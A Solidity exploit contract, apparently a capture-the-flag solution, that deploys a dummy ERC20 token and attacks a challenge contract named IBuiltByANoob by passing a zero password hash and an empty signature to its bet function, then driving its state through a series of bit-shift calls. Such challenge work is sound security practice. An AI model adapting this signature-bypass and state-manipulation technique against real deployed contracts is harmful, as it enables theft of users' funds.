pragma solidity ^0.8.11;

import "@openzeppelin/contracts4.0/token/ERC20/ERC20.sol";

contract Token is ERC20 {
    constructor(string memory name, string memory symbol, uint256 amount)
    ERC20(name, symbol)
    {
        _mint(msg.sender, amount);
    }
}

interface IBuiltByANoob {
    function bet(
        bytes32 passwordHash,
        bytes memory sig,
        IERC20 _token,
        uint256 _amount,
        bytes memory _initial
    ) external;
    function write0() external;
    function write255() external;
    function shiftLeft(uint8 n) external;
    function shiftRight(uint8 n) external;
    function setHalfByte(bytes1 b) external;
    function won() external view returns (bool);
    function _toInt() external view returns (uint256);
}


contract Exploit {
    bytes init;

    constructor(IBuiltByANoob noob) {
        Token token = new Token("SherlockUSDC", "SUSDC", 2000 ether);
        token.approve(address(noob), type(uint256).max);

        uint8 x1 = 16;
        uint8 x2 = 181;
        init.push(bytes1(x1));
        init.push(bytes1(x2));
        bytes memory sig = new bytes(65);
        noob.bet(bytes32(0), sig, token, 1, init);

        noob.write0();
        noob.setHalfByte(bytes1(uint8(7)));
        noob.shiftLeft(4);
        noob.setHalfByte(bytes1(uint8(14)));

        noob.write0();
        noob.setHalfByte(0x06);
        noob.shiftLeft(4);
        noob.setHalfByte(bytes1(uint8(13)));

        noob.write0();
        noob.setHalfByte(bytes1(uint8(10)));
        noob.shiftLeft(4);
    }

    function attack() public {

    }
}